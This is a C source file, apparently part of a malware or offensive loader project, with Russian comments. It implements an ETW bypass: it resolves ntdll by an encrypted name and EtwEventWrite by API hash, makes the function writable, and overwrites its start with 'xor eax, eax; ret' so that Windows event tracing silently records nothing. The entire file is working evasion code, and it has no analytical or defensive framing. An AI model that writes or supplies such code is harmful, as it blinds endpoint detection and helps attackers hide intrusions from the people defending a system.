// src/telemetry/etw_patch.c
// Тонкий патч ETW: патчим EtwEventWrite.

#include "etw_patch.h"
#include "../loader/api_resolver.h"
#include "../common/hashes.h"
#include "strings.h"

typedef int (__stdcall *pVirtualProtect)(void*, u64, u32, u32*);

BOOL_ patch_etw(void) {
    char ntdll_name[16];
    decrypt_string(ntdll_name, ENC_NTDLL, ENC_NTDLL_SIZE, ENC_NTDLL_KEY);
    void* nt = get_module_base_by_name(ntdll_name);
    if (!nt) return FALSE_;

    void* etw_write = resolve_api_by_hash(nt, H_EtwEventWrite);
    if (!etw_write) return FALSE_;

    pVirtualProtect pVP = (pVirtualProtect)resolve_kernel32(H_VirtualProtect);
    if (!pVP) return FALSE_;

    u32 old_protect = 0;
    if (!pVP(etw_write, 16, PAGE_EXECUTE_READWRITE_, &old_protect)) {
        return FALSE_;
    }

    // Патч: xor eax, eax ; ret
    // = 33 C0 C3  (3 байта)
    // Возвращает 0 = STATUS_SUCCESS — как будто событие записано.
    u8* p = (u8*)etw_write;
    p[0] = 0x33;  // xor eax, eax
    p[1] = 0xC0;
    p[2] = 0xC3;  // ret

    pVP(etw_write, 16, old_protect, &old_protect);
    return TRUE_;
}